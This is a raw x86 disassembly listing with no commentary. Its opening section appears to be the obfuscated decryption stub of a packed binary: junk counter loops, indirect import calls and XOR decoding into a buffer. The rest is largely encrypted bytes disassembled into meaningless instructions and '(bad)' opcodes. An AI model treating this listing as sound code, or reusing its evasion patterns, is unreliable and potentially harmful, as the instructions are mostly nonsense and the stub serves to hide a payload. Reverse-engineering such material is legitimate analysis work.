  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x4c,al
  41049c:	enter  0x56e7,0xdc
  4104a0:	mov    al,0x7e
  4104a2:	jle    0x410453
  4104a4:	jl     0x410524
  4104a6:	jle    0x41048b
  4104a8:	repnz push 0x10
  4104ab:	or     eax,0xc48a1412
  4104b0:	leave  
  4104b1:	mov    eax,DWORD PTR [ebx+esi*2]
  4104b4:	and    al,0x7c
  4104b6:	fs (bad) 
  4104b8:	sar    BYTE PTR [edi-0x28f809fb],1
  4104be:	outs   dx,BYTE PTR ds:[esi]
  4104bf:	jno    0x4104f4
  4104c1:	cmp    bl,BYTE PTR ds:0x4767ec27
  4104c7:	push   ecx
  4104c8:	bound  edx,QWORD PTR [eax-0x5364b719]
  4104ce:	mov    al,ds:0xd05e1042
  4104d3:	stc    
  4104d4:	cmp    al,cl
  4104d6:	arpl   WORD PTR [eax],si
  4104d8:	sti    
  4104d9:	ins    DWORD PTR es:[edi],dx
  4104da:	out    0xc1,eax
  4104dc:	mov    ch,0xa0
  4104de:	fdiv   DWORD PTR [edx+0x589b302]
  4104e4:	pop    ds
  4104e5:	dec    edi
  4104e6:	aad    0xfd
  4104e8:	dec    edi
  4104e9:	aaa    
  4104ea:	mov    bh,0x8c
  4104ec:	mov    bl,0xeb
  4104ee:	cmp    DWORD PTR [ebx-0x59],edx
  4104f1:	(bad)  
  4104f2:	sti    
  4104f3:	push   ebp
  4104f4:	(bad)  
  4104f5:	sbb    esi,DWORD PTR [ebx]
  4104f7:	mov    esi,0x13b37254
  4104fc:	add    edi,DWORD PTR [edx]
  4104fe:	inc    edx
  4104ff:	mov    eax,ds:0xb8131d4a
  410504:	mov    ah,0xef
  410506:	jp     0x4104b7
  410508:	mov    edx,0x9c0ba3fc
  41050d:	dec    ecx
  41050e:	int    0xf5
  410510:	mov    esi,0x2fae8dca
  410515:	int    0xea
  410517:	rol    BYTE PTR [edx],1
  410519:	xchg   esp,eax
  41051a:	add    eax,0x7d70fdf
  41051f:	mov    bh,0xb8
  410521:	cld    
  410522:	ja     0x4104db
  410524:	jl     0x41054c
  410526:	in     al,0x8
  410528:	add    al,0xf0
  41052a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41052b:	ret    0x193
  41052e:	std    
  41052f:	fsubr  QWORD PTR [ecx+0x4cf1293f]
  410535:	inc    esp
  410536:	inc    eax
  410537:	lods   eax,DWORD PTR ds:[esi]
  410538:	in     al,0x9f
  41053a:	repz test BYTE PTR [edx+0x47],bh
  41053e:	fist   DWORD PTR ds:0x6e7bec02
  410544:	stos   DWORD PTR es:[edi],eax
  410545:	mov    edi,0x15c193d6
  41054a:	fist   WORD PTR [ebp+0xdfa529a]
  410550:	inc    ecx
  410551:	nop
  410552:	pop    ss
  410553:	dec    ebx
  410554:	in     al,dx
  410555:	adc    al,0xdf
  410557:	daa    
  410558:	xchg   edi,eax
  410559:	retf   0xbb4a
  41055c:	jecxz  0x4105ae
  41055e:	add    DWORD PTR [esi],0x95649b70
  410564:	test   BYTE PTR [edx],dh
  410566:	jbe    0x41056a
  410568:	xchg   esi,eax
  410569:	push   0xffffffe7
  41056b:	mov    al,BYTE PTR [eax]
  41056d:	push   0xc090b449
  410572:	cwde   
  410573:	adc    ah,al
  410575:	add    eax,0x31a2943
  41057a:	xlat   BYTE PTR ds:[ebx]
  41057b:	dec    ebp
  41057c:	nop
  41057d:	test   al,0x8e
  41057f:	adc    ebx,esp
  410581:	or     BYTE PTR [edi],bl
  410583:	repz jle 0x410554
  410586:	nop
  410587:	push   esi
  410588:	and    DWORD PTR [edi+0x486f94c4],0x6bf77321
  410592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410593:	(bad)  
  410594:	pop    edx
  410595:	jne    0x4105c4
  410597:	mov    dl,0x5b
  410599:	inc    edi
  41059a:	dec    ebp
  41059b:	es (bad) 
  41059d:	test   eax,0x1e4d519f
  4105a2:	or     dl,BYTE PTR [eax+eiz*1-0x50]
  4105a6:	lahf   
  4105a7:	jmp    0x4105f5
  4105a9:	add    DWORD PTR [esp+eax*1+0x68868851],edx
  4105b0:	fnstsw WORD PTR [ebx+0x63e0477]
  4105b6:	sub    eax,0x80f9c440
  4105bb:	and    edi,DWORD PTR [edx]
  4105bd:	jge    0x4105ab
  4105bf:	ins    DWORD PTR es:[edi],dx
  4105c0:	ret    0x584d
  4105c3:	adc    BYTE PTR [ebx-0x27170ba6],dl
  4105c9:	cmp    dh,bl
  4105cb:	mov    eax,0xcab21449
  4105d0:	cmp    eax,0xf6cdce6c
  4105d5:	adc    esi,0xffffff8b
  4105d8:	bnd jg 0x4105d2
  4105db:	jmp    0x23665fab
  4105e0:	pop    ebp
  4105e1:	ror    DWORD PTR [eax+edx*8-0x669293bf],0xf3
  4105e9:	cmp    ah,BYTE PTR [eax]
  4105eb:	xchg   edx,eax
  4105ec:	pop    esi
  4105ed:	add    BYTE PTR [esi-0x52],bh
  4105f0:	jb     0x4105e8
  4105f2:	jo     0x41063a
  4105f4:	xor    BYTE PTR [edx+0x1d9ba502],ah
  4105fa:	sbb    eax,0xb7eb0281
  4105ff:	push   cs
  410600:	in     al,dx
  410601:	xchg   esp,edi
  410603:	push   edx
  410604:	aad    0xcf
  410606:	mov    ebx,0xb412c06e
  41060b:	adc    DWORD PTR [ecx+0x1f],edx
  41060e:	clc    
  41060f:	loop   0x4105a4
  410611:	in     al,dx
  410612:	mov    eax,ds:0xb788101
  410617:	retf   0x99a5
  41061a:	push   ebp
  41061b:	mov    ebp,0xca9551ac
  410620:	jno    0x410697
  410622:	add    esi,edi
  410624:	lods   eax,DWORD PTR ds:[esi]
  410625:	mov    dh,0x50
  410627:	pop    edx
  410628:	ja     0x4105bc
  41062a:	mov    BYTE PTR [ebx+eiz*1-0x1e],cl
  41062e:	imul   DWORD PTR [ebx+esi*8+0xb]
  410632:	lds    esp,FWORD PTR [ebp+0x56052eb3]
  410638:	xchg   edi,eax
  410639:	sub    eax,0x5d1893b0
  41063e:	cs jmp 0x78072450
  410644:	in     eax,dx
  410645:	mov    edi,0xaac67e2d
  41064a:	(bad)  
  41064b:	rol    WORD PTR [ecx+0x12f6bd15],cl
  410652:	and    esi,DWORD PTR [edi+0x135119a2]
  410658:	dec    ecx
  410659:	dec    edx
  41065a:	or     BYTE PTR [ecx-0x63],ch
  41065d:	fmul   st(1),st
  410660:	hlt    
  410661:	adc    BYTE PTR [edi],0x56
  410664:	xor    esp,DWORD PTR [ebx+0x79578a46]
  41066a:	fild   QWORD PTR [edi-0x47]
  41066d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41066e:	xchg   ecx,eax
  41066f:	stc    
  410670:	stc    
  410671:	and    DWORD PTR [ecx-0x23eeb68c],eax
  410677:	mov    edi,0xb5ea0df7
  41067c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41067d:	(bad)  
  41067e:	jmp    0x4106ee
  410680:	pop    ebp
  410681:	aas    
  410682:	mov    esp,0xd6c2c194
  410687:	pop    edx
  410688:	push   edi
  410689:	loopne 0x4106af
  41068b:	outs   dx,DWORD PTR ds:[esi]
  41068c:	and    eax,0x76470e06
  410691:	jne    0x410656
  410693:	fsub   QWORD PTR [eax-0x69aafdc2]
  410699:	xor    dh,al
  41069b:	jmp    0x410707
  41069d:	dec    esp
  41069e:	push   0xffffff97
  4106a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106a1:	jl     0x410656
  4106a3:	outs   dx,BYTE PTR ds:[esi]
  4106a4:	and    eax,0xbb34d90b
  4106a9:	sub    eax,0xb6c939af
  4106ae:	cdq    
  4106af:	scas   al,BYTE PTR es:[edi]
  4106b0:	xchg   esp,eax
  4106b1:	inc    esp
  4106b2:	mov    al,ds:0x5cf16a72
  4106b7:	cmp    al,0xdc
  4106b9:	arpl   WORD PTR [ecx+ebx*1+0x77],dx
  4106bd:	loopne 0x410689
  4106bf:	add    DWORD PTR [eax],edx
  4106c1:	mov    BYTE PTR [eax],bh
  4106c3:	mov    ds:0xff976c98,al
  4106c8:	outs   dx,BYTE PTR ds:[esi]
  4106c9:	aaa    
  4106ca:	fidivr WORD PTR [ebp+0x17]
  4106cd:	shl    eax,cl
  4106cf:	hlt    
  4106d0:	je     0x410696
  4106d2:	and    DWORD PTR [eax+0x1d111bf9],edi
  4106d8:	(bad)  
  4106d9:	std    
  4106da:	jge    0x41071c
  4106dc:	sub    esp,DWORD PTR [esi]
  4106de:	sbb    bl,BYTE PTR [esi+0x34f7c242]
  4106e4:	xor    eax,0xfd5a2ddf
  4106e9:	jae    0x41073e
  4106eb:	inc    ebx
  4106ec:	mov    esi,0x7172fd9f
  4106f1:	(bad)  
  4106f2:	fnsave [edx-0x1578041b]
  4106f8:	dec    DWORD PTR [ebp+0x1b51b420]
  4106fe:	mov    dh,0xff
  410700:	push   edi
  410701:	jbe    0x4106ae
  410703:	outs   dx,BYTE PTR ds:[esi]
  410704:	pop    DWORD PTR [ecx]
  410706:	cmp    ah,BYTE PTR [edi+0x2ce2074]
  41070c:	cmp    al,0xcb
  41070e:	rcl    al,1
  410710:	add    DWORD PTR [ebp+0x1148d277],0xffffff89
  410717:	out    0x8c,al
  410719:	(bad)
  41071c:	sbb    bl,ch
  41071e:	sbb    eax,0x7c5918e4
  410723:	stc    
  410724:	into   
  410725:	and    al,0xaa
  410727:	pop    edi
  410728:	inc    eax
  410729:	sbb    bh,BYTE PTR ds:[ebx+edx*4]
  41072d:	movd   mm5,DWORD PTR [eax-0x33d02018]
  410734:	xchg   BYTE PTR [eax],ch
  410736:	sahf   
  410737:	sbb    BYTE PTR [esi-0x5583a728],ch
  41073d:	fisttp WORD PTR [ebx]
  41073f:	popf   
  410740:	(bad)  
  410741:	cmp    ah,bl
  410743:	mov    ecx,0xd810f67e
  410748:	outs   dx,DWORD PTR ds:[esi]
  410749:	jne    0x4106e1
  41074b:	das    
  41074c:	int    0x83
  41074e:	xor    DWORD PTR cs:[ebp-0x7e57ebce],0xffffffb8
  410756:	pushf  
  410757:	push   ebx
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x5b94fca0
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107b7
  41078c:	push   edx
  41078d:	fild   DWORD PTR [eax-0x36]
  410790:	jbe    0x41071b
  410792:	cmp    esp,DWORD PTR [ecx]
  410794:	hlt    
  410795:	adc    edi,DWORD PTR [ebx]
  410797:	leave  
  410798:	in     eax,0x2f
  41079a:	scas   eax,DWORD PTR es:[edi]
  41079b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41079c:	pop    edi
  41079d:	jo     0x4107f6
  41079f:	add    DWORD PTR [esp+ecx*8-0x11dd75c],0xe48d67b3
  4107aa:	mov    eax,ds:0x4935b9a5
  4107af:	shl    ecx,1
  4107b1:	das    
  4107b2:	mov    DWORD PTR [ebx+0x29ca1192],esi
  4107b8:	mov    esi,0xf53aa3ea
  4107bd:	jp     0x410809
  4107bf:	jmp    0x410755
  4107c1:	jnp    0x4107f0
  4107c3:	fistp  QWORD PTR [esi+0x78]
  4107c6:	xor    al,0x67
  4107c8:	jne    0x4107a6
  4107ca:	loopne 0x4107aa
  4107cc:	xor    ecx,DWORD PTR cs:[edx]
  4107cf:	cmp    edx,DWORD PTR [edi+eax*1-0x3a928b31]
  4107d6:	push   edx
  4107d7:	push   edi
  4107d8:	rcl    DWORD PTR [ebx-0x4d516be],0x92
  4107df:	or     BYTE PTR [edx],ah
  4107e1:	pop    esi
  4107e2:	enter  0x2448,0x75
  4107e6:	icebp  
  4107e7:	sbb    eax,0x186735b
  4107ec:	call   0x403163ff
  4107f1:	fbld   TBYTE PTR [edi]
  4107f3:	imul   ecx,DWORD PTR [edx+0x6512c2b8],0xffffffad
  4107fa:	xchg   edx,eax
  4107fb:	mov    DWORD PTR [ebp-0x340363cd],esi
  410801:	popa   
  410802:	je     0x410867
  410804:	add    ch,BYTE PTR [edi+esi*2+0x41]
  410808:	and    eax,0xc365dc9f
  41080d:	xchg   BYTE PTR [ebp+0x6147f9b5],dl
  410813:	mov    ch,0x47
  410815:	add    dh,dl
  410817:	jmp    0x410866
  410819:	ins    BYTE PTR es:[edi],dx
  41081a:	xchg   edi,eax
  41081b:	scas   eax,DWORD PTR es:[edi]
  41081c:	add    al,0x2c
  41081e:	cmp    esi,DWORD PTR [esi]
  410820:	inc    esi
  410821:	ret    
  410822:	add    BYTE PTR [eax+0x73],0xe0
  410826:	xchg   ebp,eax
  410827:	dec    esi
  410828:	retf   
  410829:	or     DWORD PTR [eax-0x7d79a6a3],ebx
  41082f:	ja     0x4107e5
  410831:	adc    dl,BYTE PTR [ebp+0x5aa9ab57]
  410837:	mov    edi,0xb3cdca60
  41083c:	gs hlt 
  41083e:	(bad)  
  41083f:	setp   cl
  410842:	dec    esi
  410843:	mov    ecx,0x3351241b
  410848:	sar    eax,0x3c
  41084b:	or     DWORD PTR [edx+0x76],0xffffffc7
  41084f:	inc    ebp
  410850:	sub    al,0xe9
  410852:	mov    ds:0xc0d94a0e,eax
  410857:	mov    bl,0x7c
  410859:	cmp    BYTE PTR [ebx],al
  41085b:	inc    ebx
  41085c:	sti    
  41085d:	push   0x273fb8eb
  410862:	lock test al,0x37
  410865:	nop
  410866:	or     BYTE PTR [edx],al
  410868:	addr16 popf 
  41086a:	out    dx,al
  41086b:	(bad)  
  41086d:	pop    eax
  41086e:	push   ecx
  41086f:	stc    
  410870:	push   ecx
  410871:	enter  0x6a75,0x93
  410875:	loope  0x410806
  410877:	jnp    0x4108b5
  410879:	(bad)  
  41087a:	int3   
  41087b:	ret    
  41087c:	lahf   
  41087d:	mov    ebx,ebp
  41087f:	xchg   ebp,eax
  410880:	or     eax,0xadfed7a3
  410885:	sub    ebx,DWORD PTR [si-0x4]
  410889:	out    0xa4,eax
  41088b:	adc    eax,0x32a5b04d
  410890:	aad    0x46
  410892:	cli    
  410893:	cld    
  410894:	jmp    0x95070700
  410899:	jmp    0xefbb2b4
  41089e:	sahf   
  41089f:	es icebp 
  4108a1:	stc    
  4108a2:	push   edx
  4108a3:	repz int3 
  4108a5:	cmp    eax,0x30bc0c19
  4108aa:	sti    
  4108ab:	jne    0x4108eb
  4108ad:	dec    esi
  4108ae:	xrelease mov BYTE PTR [esi-0x4a6af5f6],dh
  4108b5:	xlat   BYTE PTR ds:[ebx]
  4108b6:	push   ebx
  4108b7:	pop    eax
  4108b8:	(bad)  
  4108b9:	aad    0xbf
  4108bb:	and    ecx,0x4963110c
  4108c1:	mov    esi,0xe5c5c5e
  4108c6:	push   esi
  4108c7:	adc    al,0x3c
  4108c9:	push   esi
  4108ca:	jl     0x4108f2
  4108cc:	test   al,0xb1
  4108ce:	jmp    0x87e1:0x3450140e
  4108d5:	jge    0x4108f1
  4108d7:	mov    edx,0x446f2c81
  4108dc:	scas   eax,DWORD PTR es:[edi]
  4108dd:	sbb    esp,DWORD PTR [esi+eax*1+0x7a]
  4108e1:	(bad)  
  4108e2:	mov    cl,0x49
  4108e4:	fmul   DWORD PTR [eax]
  4108e6:	ret    
  4108e7:	mov    edi,0xa05a5191
  4108ec:	and    al,0xc3
  4108ee:	in     eax,dx
  4108ef:	dec    edi
  4108f0:	cmp    al,0x15
  4108f2:	dec    edx
  4108f3:	xchg   ebx,eax
  4108f4:	out    0xb7,eax
  4108f6:	imul   ecx,ebp,0xfffffffc
  4108f9:	xor    eax,0xc2441d96
  4108fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ff:	add    eax,0x55820e78
  410904:	call   0xf8c643c2
  410909:	inc    esp
  41090a:	lods   eax,DWORD PTR ds:[esi]
  41090b:	push   esp
  41090c:	lods   al,BYTE PTR ds:[si]
  41090e:	mov    ecx,0x16c55685
  410913:	xchg   ebp,eax
  410914:	lock ret 0x27d1
  410918:	push   es
  410919:	push   0x71
  41091b:	fistp  DWORD PTR [ecx]
  41091d:	sbb    dl,BYTE PTR [esi]
  41091f:	or     eax,eax
  410921:	inc    ecx
  410922:	adc    ebp,DWORD PTR [ecx]
  410924:	adc    BYTE PTR [edi+0x15035eb8],bl
  41092a:	cmp    ch,BYTE PTR [ebx+0x53]
  41092d:	jne    0x4108ee
  41092f:	push   ss
  410930:	mov    bl,0xd
  410932:	jo     0x41092f
  410934:	test   BYTE PTR [edx],bh
  410936:	stc    
  410937:	scas   eax,DWORD PTR es:[edi]
  410938:	xchg   BYTE PTR [edx],bl
  41093a:	fadd   DWORD PTR [esi]
  41093c:	scas   eax,DWORD PTR es:[edi]
  41093d:	mov    edx,0x3b64c7a4
  410942:	cmp    al,0xcd
  410944:	push   edx
  410945:	pop    edi
  410946:	(bad)  
  410948:	in     eax,dx
  410949:	test   eax,0x66d9ff7
  41094e:	xor    edi,eax
  410950:	arpl   WORD PTR [eax-0x78803483],si
  410956:	jne    0x410980
  410958:	xchg   ecx,eax
  410959:	in     al,dx
  41095a:	mov    al,ds:0xdd8fed30
  41095f:	dec    eax
  410960:	adc    al,0x2f
  410962:	aam    0x54
  410964:	xchg   esp,eax
  410965:	fisttp WORD PTR [eax]
  410967:	dec    edi
  410968:	jnp    0x41090e
  41096a:	mov    ebp,0x52b993fa
  41096f:	dec    ebp
  410970:	sbb    DWORD PTR [ecx],eax
  410972:	sub    ch,BYTE PTR [ecx+0x39ffc374]
  410978:	add    eax,DWORD PTR [ebx-0x28a8d43e]
  41097e:	fsub   DWORD PTR [esi+0x77]
  410981:	hlt    
  410982:	mov    al,0x52
  410984:	jg     0x410914
  410986:	call   0x14283d2a
  41098b:	lock (bad) 
  41098d:	(bad)  
  41098e:	pop    esi
  41098f:	cwde   
  410990:	test   bh,al
  410992:	jle    0x410984
  410994:	inc    esi
  410995:	mov    edx,0x9d5ffcff
  41099a:	mov    cl,0x84
  41099c:	aad    0xcf
  41099e:	jle    0x4109c6
  4109a0:	jmp    0x8e15:0xa0251d92
  4109a7:	xlat   BYTE PTR ds:[ebx]
  4109a8:	pop    eax
  4109a9:	mov    eax,0x7170d39b
  4109ae:	leave  
  4109af:	sbb    al,0x72
  4109b1:	pusha  
  4109b2:	mov    dl,0x3e
  4109b4:	fxch   st(7)
  4109b6:	and    DWORD PTR [eax],esi
  4109b8:	(bad)  
  4109b9:	dec    esp
  4109ba:	rcr    BYTE PTR [ecx],0x1
  4109bd:	dec    ebp
  4109be:	cmovae esi,DWORD PTR [ecx]
  4109c1:	pop    ebx
  4109c2:	es jo  0x41099f
  4109c5:	pop    ecx
  4109c6:	jge    0x41097d
  4109c8:	loope  0x410a1c
  4109ca:	mov    ebx,0xf09b0d79
  4109cf:	pop    ebp
  4109d0:	in     al,0x6f
  4109d2:	dec    ebp
  4109d3:	pop    ecx
  4109d4:	nop
  4109d5:	shl    DWORD PTR [ecx-0x12],cl
  4109d8:	cmp    edx,DWORD PTR [edi]
  4109da:	inc    edx
  4109db:	xor    bh,BYTE PTR [ebx]
  4109dd:	dec    edi
  4109de:	jge    0x4109d3
  4109e0:	jmp    0x75e282aa
  4109e5:	jp     0x4109b2
  4109e7:	mov    ecx,DWORD PTR [edi-0x37]
  4109ea:	push   eax
  4109eb:	xor    DWORD PTR [esp+esi*2],edx
  4109ee:	mov    eax,ds:0xbf5f3d86
  4109f3:	jle    0x41099d
  4109f5:	out    dx,eax
  4109f6:	int    0xa7
  4109f8:	and    eax,0x4000300
  4109fd:	ficomp WORD PTR [eax+eiz*2+0x3ad1678e]
  410a04:	loope  0x41098f
  410a06:	outs   dx,BYTE PTR ds:[esi]
  410a07:	mov    ebp,0x2792dac6
  410a0c:	rol    BYTE PTR ss:0x3efe13ad,0x73
  410a14:	out    dx,eax
  410a15:	mov    ds:0xa7333059,eax
  410a1a:	sub    al,0xdd
  410a1c:	dec    edi
  410a1d:	add    BYTE PTR [ebp-0x6],ch
  410a20:	sub    eax,0x892219fd
  410a25:	aas    
  410a26:	lea    eax,[ebx]
  410a28:	pop    ss
  410a29:	(bad)  
  410a2a:	int    0x68
  410a2c:	mov    ?,WORD PTR [ebp-0x54b6acf8]
  410a32:	jp     0x4109bc
  410a34:	rcr    dh,0xa7
  410a37:	idiv   DWORD PTR [esi+0x62]
  410a3a:	or     ecx,edi
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	dec    esi
  410a50:	sbb    ebx,ebp
  410a52:	cmp    al,0xba
  410a54:	mov    ebp,0x7caf7e7e
  410a59:	jle    0x410ad9
  410a5b:	cdq    
  410a5c:	push   ebx
  410a5d:	jnp    0x410ab2
  410a5f:	mov    ebp,0xed6ad2da
  410a64:	out    dx,eax
  410a65:	mov    esi,0x7304736e
  410a6a:	mov    ebx,0xa8bc6ba8
  410a6f:	lds    ebp,FWORD PTR [edx+ebp*2]
  410a72:	into   
  410a73:	ins    DWORD PTR es:[edi],dx
  410a74:	cmp    BYTE PTR [eax+0x53de9f47],dl
  410a7a:	and    DWORD PTR [esi-0x378f13c5],0xffffffed
  410a81:	dec    eax
  410a82:	or     al,0x1c
  410a84:	ins    BYTE PTR es:[edi],dx
  410a85:	(bad)  
  410a86:	jge    0x410ab6
  410a88:	mov    BYTE PTR [ebx],dh
  410a8a:	fcmovnbe st,st(2)
  410a8c:	pop    eax
  410a8d:	xchg   edx,eax
  410a8e:	sbb    eax,DWORD PTR [edx-0x34]
  410a91:	cld    
  410a92:	jp     0x410aac
  410a94:	cli    
  410a95:	push   0x7d
  410a97:	hlt    
  410a98:	add    esp,DWORD PTR [esi+0x5e]
  410a9b:	mov    cl,0x96
  410a9d:	out    dx,al
  410a9e:	outs   dx,BYTE PTR ds:[esi]
  410a9f:	fwait
  410aa0:	dec    edx
  410aa1:	(bad)  
  410aa2:	sar    DWORD PTR [edx+0x4809a525],1
  410aa8:	dec    eax
  410aa9:	in     eax,0xb8
  410aab:	adc    BYTE PTR [ebx],ah
  410aad:	push   ecx
  410aae:	add    eax,0xceb49218
  410ab3:	dec    eax
  410ab4:	pop    ss
  410ab5:	mov    al,0x45
  410ab7:	jns    0x410a7f
  410ab9:	xchg   ebx,eax
  410aba:	lock or edx,DWORD PTR [eax+edx*1-0x25]
  410abf:	gs mov cl,0x61
  410ac2:	js     0x410ab3
  410ac4:	mov    cl,0x3e
  410ac6:	adc    DWORD PTR [esi-0x35],edi
  410ac9:	std    
  410aca:	and    eax,0xa7c387d5
  410acf:	adc    BYTE PTR [edi+0x27],0xcb
  410ad3:	dec    ebp
  410ad4:	mov    bl,0x2
  410ad6:	iret   
  410ad7:	cmc    
  410ad8:	or     DWORD PTR [edx-0x4942952],ebx
  410ade:	ss cli 
  410ae0:	jmp    0xa935:0x8ee6810
  410ae7:	adc    dl,BYTE PTR [ebx+eiz*8]
  410aea:	fnstcw WORD PTR [ecx+0x54]
  410aed:	repnz pop edx
  410aef:	cmp    al,0xad
  410af1:	xor    esp,esi
  410af3:	cmp    DWORD PTR [edi+0x5e],esi
  410af6:	hlt    
  410af7:	cmp    ch,0x3f
  410afa:	(bad)  
  410afb:	mov    gs,esp
  410afd:	sub    edx,DWORD PTR [eax-0x7c]
  410b00:	ror    DWORD PTR [ecx-0x56844821],cl
  410b06:	adc    eax,0x70d8f0d2
  410b0b:	ins    DWORD PTR es:[edi],dx
  410b0c:	fidiv  DWORD PTR [ebx+ecx*1+0x42]
  410b10:	ins    DWORD PTR es:[edi],dx
  410b11:	dec    ebx
  410b12:	ret    0xc144
  410b15:	cwde   
  410b16:	into   
  410b17:	push   ebp
  410b18:	push   ebp
  410b19:	cmp    eax,0xd94827a7
  410b1e:	add    eax,0x7fc13f06
  410b23:	mov    al,0xaa
  410b25:	ja     0x410b5c
  410b27:	cmp    esi,esp
  410b29:	inc    eax
  410b2a:	aaa    
  410b2b:	xor    eax,0xa72c73ec
  410b30:	adc    DWORD PTR [ebx-0x7a],ebx
  410b33:	xor    eax,0x9604e8e7
  410b38:	stc    
  410b39:	daa    
  410b3a:	mov    bh,0x12
  410b3c:	pop    eax
  410b3d:	mov    edi,0x8dd355ef
  410b42:	jo     0x410b15
  410b44:	or     eax,edi
  410b46:	mov    ch,0xea
  410b48:	mov    ch,0xf9
  410b4a:	test   BYTE PTR [edx-0x2a8da95f],dh
  410b50:	mov    BYTE PTR [edi+0x62a4a4d8],cl
  410b56:	add    al,0x63
  410b58:	stc    
  410b59:	and    al,0x91
  410b5b:	lahf   
  410b5c:	mov    esp,0xa798bb06
  410b61:	inc    esi
  410b62:	in     eax,dx
  410b63:	xchg   BYTE PTR [edi+edi*2-0x73],ch
  410b67:	enter  0xc3cd,0x8f
  410b6b:	xor    BYTE PTR [edi+0x21],bh
  410b6e:	and    eax,0xb495a358
  410b73:	fcom   QWORD PTR [esi+eiz*2]
  410b76:	mov    dl,0x7d
  410b78:	and    BYTE PTR [ecx],bl
  410b7a:	fcmovnbe st,st(5)
  410b7c:	push   es
  410b7d:	dec    eax
  410b7e:	cmp    BYTE PTR [ecx+ebp*2+0x7d],dh
  410b82:	jecxz  0x410be8
  410b84:	xor    BYTE PTR [ebx-0x1626b532],dl
  410b8a:	dec    edi
  410b8b:	jge    0x410b78
  410b8d:	pop    ebx
  410b8e:	sub    BYTE PTR [edx+0x51],dl
  410b91:	in     al,0xf5
  410b93:	call   0xbf648074
